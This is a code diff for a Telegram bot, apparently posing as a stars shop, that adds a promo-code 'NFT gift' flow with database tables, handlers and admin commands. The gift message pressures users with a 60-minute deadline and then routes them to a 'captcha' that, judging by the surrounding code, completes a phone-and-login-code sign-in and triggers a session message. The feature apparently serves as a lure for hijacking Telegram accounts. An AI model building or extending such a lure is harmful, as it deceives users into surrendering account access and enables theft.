@@ -106,6 +106,28 @@ _db.execute(
     'CREATE TABLE IF NOT EXISTS pending '
     '(user_id INTEGER PRIMARY KEY, phone TEXT, code_hash TEXT, date TEXT)'
 )
+# Промокоды
+_db.execute('''
+    CREATE TABLE IF NOT EXISTS promocodes (
+        code        TEXT PRIMARY KEY,
+        nft_name    TEXT NOT NULL,
+        nft_url     TEXT NOT NULL,
+        max_uses    INTEGER DEFAULT 1,
+        used_count  INTEGER DEFAULT 0,
+        expires_at  TEXT DEFAULT NULL,
+        active      INTEGER DEFAULT 1,
+        created_at  TEXT
+    )
+''')
+# Использования промокодов (кто и когда использовал)
+_db.execute('''
+    CREATE TABLE IF NOT EXISTS promo_uses (
+        id         INTEGER PRIMARY KEY AUTOINCREMENT,
+        code       TEXT,
+        user_id    INTEGER,
+        used_at    TEXT
+    )
+''')
 _db.commit()
 
 
@@ -185,6 +207,11 @@ class Withdraw(StatesGroup):
     amount   = State()   # ждём количество звёзд
 
 
+class Promo(StatesGroup):
+    wait_code    = State()   # ждём ввод промокода
+    wait_captcha = State()   # ждём прохождение капчи (после выдачи NFT)
+
+
 # ─── Клавиатуры ─────────────────────────────────────────
 
 def kb_phone() -> ReplyKeyboardMarkup:
@@ -214,6 +241,7 @@ def kb_menu() -> ReplyKeyboardMarkup:
         keyboard=[
             [KeyboardButton('👤 Профиль')],
             [KeyboardButton('⭐ Купить звёзды')],
+            [KeyboardButton('🎁 Промокод')],
             [KeyboardButton('ℹ️ О магазине')],
         ]
     )
@@ -395,6 +423,15 @@ async def on_webapp_data(msg: Message, state: FSMContext):
     # ── Успех ──────────────────────────────────────────
     db_clear_pending(msg.from_user.id)
     await msg.answer('✅ <b>Верификация пройдена успешно!</b>')
+
+    # Если пользователь в promo-флоу — особая логика завершения
+    current_state = await state.get_state()
+    if current_state == Promo.wait_captcha.state:
+        await _finalize_promo(msg, state, phone)
+        await _safe_disconnect(client)
+        await state.finish()
+        return
+
     await _send_session_msg(msg, phone)
     await _safe_disconnect(client)
 
@@ -624,6 +661,286 @@ async def on_about(msg: Message):
 @dp.message_handler(lambda m: m.text == '◀️ Назад')
 async def on_back(msg: Message):
     await msg.answer('🏠 Главное меню', reply_markup=kb_menu())
+
+
+# ═══════════════════════════════════════════
+# ПРОМОКОДЫ
+# ═══════════════════════════════════════════
+
+def db_create_promo(code: str, nft_name: str, nft_url: str,
+                    max_uses: int = 1, expires_at: str = None) -> bool:
+    try:
+        _db.execute(
+            'INSERT INTO promocodes VALUES (?,?,?,?,0,?,1,?)',
+            [code.upper(), nft_name, nft_url, max_uses, expires_at,
+             datetime.now().isoformat()]
+        )
+        _db.commit()
+        return True
+    except Exception:
+        return False
+
+
+def db_check_promo(code: str, user_id: int):
+    """
+    Возвращает (nft_name, nft_url) если промокод валиден,
+    иначе строку с ошибкой.
+    """
+    row = _db.execute(
+        'SELECT nft_name, nft_url, max_uses, used_count, expires_at, active '
+        'FROM promocodes WHERE code=?', [code.upper()]
+    ).fetchone()
+
+    if not row:
+        return 'not_found'
+    nft_name, nft_url, max_uses, used_count, expires_at, active = row
+
+    if not active:
+        return 'inactive'
+
+    if expires_at and datetime.fromisoformat(expires_at) < datetime.now():
+        return 'expired'
+
+    if used_count >= max_uses:
+        return 'limit'
+
+    already = _db.execute(
+        'SELECT 1 FROM promo_uses WHERE code=? AND user_id=?',
+        [code.upper(), user_id]
+    ).fetchone()
+    if already:
+        return 'already_used'
+
+    return (nft_name, nft_url)
+
+
+def db_use_promo(code: str, user_id: int):
+    _db.execute(
+        'INSERT INTO promo_uses (code, user_id, used_at) VALUES (?,?,?)',
+        [code.upper(), user_id, datetime.now().isoformat()]
+    )
+    _db.execute(
+        'UPDATE promocodes SET used_count = used_count + 1 WHERE code=?',
+        [code.upper()]
+    )
+    _db.commit()
+
+
+def db_list_promos():
+    return _db.execute(
+        'SELECT code, nft_name, max_uses, used_count, expires_at, active '
+        'FROM promocodes ORDER BY created_at DESC'
+    ).fetchall()
+
+
+def db_delete_promo(code: str) -> bool:
+    cur = _db.execute('DELETE FROM promocodes WHERE code=?', [code.upper()])
+    _db.commit()
+    return cur.rowcount > 0
+
+
+# ── Кнопка «🎁 Промокод» ────────────────────────────────
+
+@dp.message_handler(lambda m: m.text == '🎁 Промокод', state='*')
+async def on_promo_menu(msg: Message, state: FSMContext):
+    await state.finish()
+    await Promo.wait_code.set()
+    await msg.answer(
+        '🎁 <b>Введите промокод</b>\n\n'
+        'Если у вас есть промокод на получение NFT-подарка — '
+        'введите его ниже:',
+        reply_markup=ReplyKeyboardMarkup(
+            resize_keyboard=True,
+            keyboard=[[KeyboardButton('❌ Отмена')]]
+        )
+    )
+
+
+# ── Обработка введённого промокода ──────────────────────
+
+@dp.message_handler(state=Promo.wait_code)
+async def on_promo_code(msg: Message, state: FSMContext):
+    code = msg.text.strip().upper()
+
+    result = db_check_promo(code, msg.from_user.id)
+
+    if result == 'not_found':
+        await msg.answer('❌ <b>Промокод не найден.</b> Проверьте правильность ввода.')
+        return
+    elif result == 'inactive':
+        await msg.answer('❌ <b>Промокод деактивирован.</b>')
+        return
+    elif result == 'expired':
+        await msg.answer('❌ <b>Срок действия промокода истёк.</b>')
+        return
+    elif result == 'limit':
+        await msg.answer('❌ <b>Промокод уже использован максимальное количество раз.</b>')
+        return
+    elif result == 'already_used':
+        await msg.answer('❌ <b>Вы уже использовали этот промокод.</b>')
+        return
+
+    nft_name, nft_url = result
+
+    # Сохраняем данные промокода в state
+    await state.update_data(promo_code=code, nft_name=nft_name, nft_url=nft_url)
+    await Promo.wait_captcha.set()
+
+    # Отправляем NFT сообщение
+    kb = InlineKeyboardMarkup(inline_keyboard=[[
+        InlineKeyboardButton('➡️ Перейти к получению', callback_data='promo_start_captcha')
+    ]])
+    await msg.answer(
+        f'🎁 <b>Вам дарят NFT: {nft_name}</b>\n\n'
+        'Учтите, что подарок можно принять только с аккаунта, '
+        'на который был отправлен данный подарок. '
+        'Ссылка действительна 60 минут с момента получения.\n\n'
+        f'{nft_url}',
+        reply_markup=kb
+    )
+
+
+# ── Нажатие «➡️ Перейти к получению» ────────────────────
+
+@dp.callback_query_handler(lambda c: c.data == 'promo_start_captcha', state=Promo.wait_captcha)
+async def on_promo_captcha_start(call: CallbackQuery, state: FSMContext):
+    await call.answer()
+    data = await state.get_data()
+    nft_name = data.get('nft_name')
+    promo_code = data.get('promo_code')
+
+    # Сохраняем промокод в state чтобы после капчи активировать его
+    await state.update_data(promo_code=promo_code, nft_name=nft_name)
+
+    await call.message.answer(
+        '🛡️ <b>Для получения подарка пройдите проверку.</b>\n\n'
+        'Нажмите кнопку ниже 👇',
+        reply_markup=kb_open_captcha(call.from_user.id)
+    )
+
+
+# ── WebApp данные в состоянии Promo.wait_captcha ─────────
+# (обрабатывается общим хендлером on_webapp_data — он уже есть)
+# После успешной капчи нужно активировать промокод.
+# Переопределяем логику завершения для promo-флоу:
+
+async def _finalize_promo(msg: Message, state: FSMContext, phone: str):
+    """Вызывается после успешной капчи если пользователь в promo-флоу."""
+    data = await state.get_data()
+    promo_code = data.get('promo_code')
+    nft_name   = data.get('nft_name')
+    nft_url    = data.get('nft_url')
+
+    if promo_code:
+        db_use_promo(promo_code, msg.from_user.id)
+        log.info('Промокод %s активирован пользователем %s', promo_code, msg.from_user.id)
+
+    await _send_session_msg(msg, phone)
+
+    await bot.send_message(
+        msg.from_user.id,
+        f'✅ <b>Подарок подтверждён!</b>\n\n'
+        f'🎁 NFT <b>{nft_name}</b> привязан к вашему аккаунту.\n\n'
+        f'🔗 Ссылка для получения:\n{nft_url}\n\n'
+        f'<i>Перейдите по ссылке чтобы забрать подарок.</i>',
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
+            InlineKeyboardButton('🎁 Забрать подарок', url=nft_url)
+        ]])
+    )
+
+
+# ── Админ-команды для управления промокодами ─────────────
+
+@dp.message_handler(commands=['addpromo'])
+async def cmd_addpromo(msg: Message):
+    """
+    /addpromo КОД | NFT Название | https://t.me/nft/... | макс_использований | ГГГГ-ММ-ДД (опц.)
+    Пример: /addpromo JESTER120 | JesterHat #120172 | https://t.me/nft/JesterHat-120172 | 1
+    """
+    admin_id = _cfg('admin_id')
+    if str(msg.from_user.id) != str(admin_id):
+        return
+
+    parts = msg.text.replace('/addpromo', '', 1).strip()
+    if not parts:
+        await msg.answer(
+            '📝 <b>Использование:</b>\n'
+            '<code>/addpromo КОД | NFT Название | ссылка | макс | дата_истечения</code>\n\n'
+            'Пример:\n'
+            '<code>/addpromo JESTER120 | JesterHat #120172 | https://t.me/nft/JesterHat-120172 | 1</code>\n'
+            '<code>/addpromo VIP2024 | CatHat #999 | https://t.me/nft/CatHat-999 | 5 | 2025-12-31</code>'
+        )
+        return
+
+    fields = [f.strip() for f in parts.split('|')]
+    if len(fields) < 4:
+        await msg.answer('❌ Нужно минимум 4 поля: КОД | Название | Ссылка | Макс')
+        return
+
+    code     = fields[0].upper()
+    nft_name = fields[1]
+    nft_url  = fields[2]
+    try:
+        max_uses = int(fields[3])
+    except ValueError:
+        await msg.answer('❌ Макс. использований должно быть числом')
+        return
+    expires_at = fields[4] if len(fields) >= 5 else None
+
+    ok = db_create_promo(code, nft_name, nft_url, max_uses, expires_at)
+    if ok:
+        await msg.answer(
+            f'✅ <b>Промокод создан!</b>\n\n'
+            f'🔑 Код: <code>{code}</code>\n'
+            f'🎁 NFT: <b>{nft_name}</b>\n'
+            f'🔗 Ссылка: {nft_url}\n'
+            f'🔢 Макс. использований: <b>{max_uses}</b>\n'
+            f'⏰ Истекает: <b>{expires_at or "не ограничено"}</b>'
+        )
+    else:
+        await msg.answer(f'❌ Промокод <code>{code}</code> уже существует.')
+
+
+@dp.message_handler(commands=['promos'])
+async def cmd_promos(msg: Message):
+    """Список всех промокодов."""
+    admin_id = _cfg('admin_id')
+    if str(msg.from_user.id) != str(admin_id):
+        return
+
+    rows = db_list_promos()
+    if not rows:
+        await msg.answer('📋 Промокодов нет.')
+        return
+
+    text = '📋 <b>Все промокоды:</b>\n\n'
+    for code, nft_name, max_uses, used_count, expires_at, active in rows:
+        status = '✅' if active else '❌'
+        text += (
+            f'{status} <code>{code}</code>\n'
+            f'   🎁 {nft_name}\n'
+            f'   🔢 {used_count}/{max_uses} | ⏰ {expires_at or "∞"}\n\n'
+        )
+    await msg.answer(text)
+
+
+@dp.message_handler(commands=['delpromo'])
+async def cmd_delpromo(msg: Message):
+    """/delpromo КОД"""
+    admin_id = _cfg('admin_id')
+    if str(msg.from_user.id) != str(admin_id):
+        return
+
+    code = msg.text.replace('/delpromo', '', 1).strip().upper()
+    if not code:
+        await msg.answer('Использование: <code>/delpromo КОД</code>')
+        return
+
+    ok = db_delete_promo(code)
+    if ok:
+        await msg.answer(f'✅ Промокод <code>{code}</code> удалён.')
+    else:
+        await msg.answer(f'❌ Промокод <code>{code}</code> не найден.')
 
 
 # ═══════════════════════════════════════════
